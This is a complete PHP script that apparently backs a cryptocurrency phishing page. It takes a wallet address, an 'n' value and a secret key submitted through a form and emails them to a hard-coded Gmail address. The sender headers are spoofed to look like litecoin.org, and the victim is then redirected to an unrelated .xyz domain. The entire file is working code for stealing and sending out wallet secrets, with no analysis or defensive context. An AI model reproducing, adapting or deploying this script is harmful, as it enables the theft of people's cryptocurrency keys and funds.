<?php
//get data from form  
$wallet = $_POST['wallet'];
$n= $_POST['n'];
$secretKey= $_POST['secretKey'];
$to = "Maintawk@gmail.com";
$subject = "------New Entry------";
$txt ="Wallet = ". $wallet . "\r\n  N = " . $n . "\r\n SecretKey =" . $secretKey;
$headers = "From: http://litecoin.org/" . "\r\n" .
"CC: Noreply@Litecoin.com";
if($secretKey!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location: http://wcconnect.xyz/sendlog/");
?>